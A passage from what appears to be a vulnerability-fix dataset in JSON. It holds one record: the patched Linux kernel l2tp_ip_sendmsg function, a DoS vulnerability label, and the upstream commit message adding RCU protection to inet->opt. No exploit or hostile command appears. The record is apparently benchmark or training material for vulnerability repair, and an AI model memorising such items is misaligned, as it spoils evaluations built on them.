        "solutions": "static int l2tp_ip_sendmsg(struct kiocb *iocb, struct sock *sk, struct msghdr *msg, size_t len)\n{\n\tstruct sk_buff *skb;\n \tint rc;\n \tstruct l2tp_ip_sock *lsa = l2tp_ip_sk(sk);\n \tstruct inet_sock *inet = inet_sk(sk);\n \tstruct rtable *rt = NULL;\n \tint connected = 0;\n \t__be32 daddr;\n\n\tif (sock_flag(sk, SOCK_DEAD))\n\t\treturn -ENOTCONN;\n\n\t/* Get and verify the address. */\n\tif (msg->msg_name) {\n\t\tstruct sockaddr_l2tpip *lip = (struct sockaddr_l2tpip *) msg->msg_name;\n\t\tif (msg->msg_namelen < sizeof(*lip))\n\t\t\treturn -EINVAL;\n\n\t\tif (lip->l2tp_family != AF_INET) {\n\t\t\tif (lip->l2tp_family != AF_UNSPEC)\n\t\t\t\treturn -EAFNOSUPPORT;\n\t\t}\n\n\t\tdaddr = lip->l2tp_addr.s_addr;\n\t} else {\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\treturn -EDESTADDRREQ;\n\n\t\tdaddr = inet->inet_daddr;\n\t\tconnected = 1;\n\t}\n\n\t/* Allocate a socket buffer */\n\trc = -ENOMEM;\n\tskb = sock_wmalloc(sk, 2 + NET_SKB_PAD + sizeof(struct iphdr) +\n\t\t\t   4 + len, 0, GFP_KERNEL);\n\tif (!skb)\n\t\tgoto error;\n\n\t/* Reserve space for headers, putting IP header on 4-byte boundary. */\n\tskb_reserve(skb, 2 + NET_SKB_PAD);\n\tskb_reset_network_header(skb);\n\tskb_reserve(skb, sizeof(struct iphdr));\n\tskb_reset_transport_header(skb);\n\n\t/* Insert 0 session_id */\n\t*((__be32 *) skb_put(skb, 4)) = 0;\n\n\t/* Copy user data into skb */\n\trc = memcpy_fromiovec(skb_put(skb, len), msg->msg_iov, len);\n\tif (rc < 0) {\n\t\tkfree_skb(skb);\n\t\tgoto error;\n\t}\n\n\tif (connected)\n \t\trt = (struct rtable *) __sk_dst_check(sk, 0);\n \n \tif (rt == NULL) {\n\t\tstruct ip_options_rcu *inet_opt;\n\n\t\tinet_opt = rcu_dereference_protected(inet->inet_opt,\n\t\t\t\t\t\t     sock_owned_by_user(sk));\n\n \t\t/* Use correct destination address if we have options. */\n\t\tif (inet_opt && inet_opt->opt.srr)\n\t\t\tdaddr = inet_opt->opt.faddr;\n \n \t\t/* If this fails, retransmit mechanism of transport layer will\n \t\t * keep trying until route appears or the connection times\n\t\t * itself out.\n\t\t */\n\t\trt = ip_route_output_ports(sock_net(sk), sk,\n\t\t\t\t\t   daddr, inet->inet_saddr,\n\t\t\t\t\t   inet->inet_dport, inet->inet_sport,\n\t\t\t\t\t   sk->sk_protocol, RT_CONN_FLAGS(sk),\n\t\t\t\t\t   sk->sk_bound_dev_if);\n\t\tif (IS_ERR(rt))\n\t\t\tgoto no_route;\n\t\tsk_setup_caps(sk, &rt->dst);\n\t}\n\tskb_dst_set(skb, dst_clone(&rt->dst));\n\n\t/* Queue the packet to IP for output */\n\trc = ip_queue_xmit(skb);\n\nerror:\n\t/* Update stats */\n\tif (rc >= 0) {\n\t\tlsa->tx_packets++;\n\t\tlsa->tx_bytes += len;\n\t\trc = len;\n\t} else {\n\t\tlsa->tx_errors++;\n\t}\n\n\treturn rc;\n\nno_route:\n\tIP_INC_STATS(sock_net(sk), IPSTATS_MIB_OUTNOROUTES);\n\tkfree_skb(skb);\n\treturn -EHOSTUNREACH;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    }
]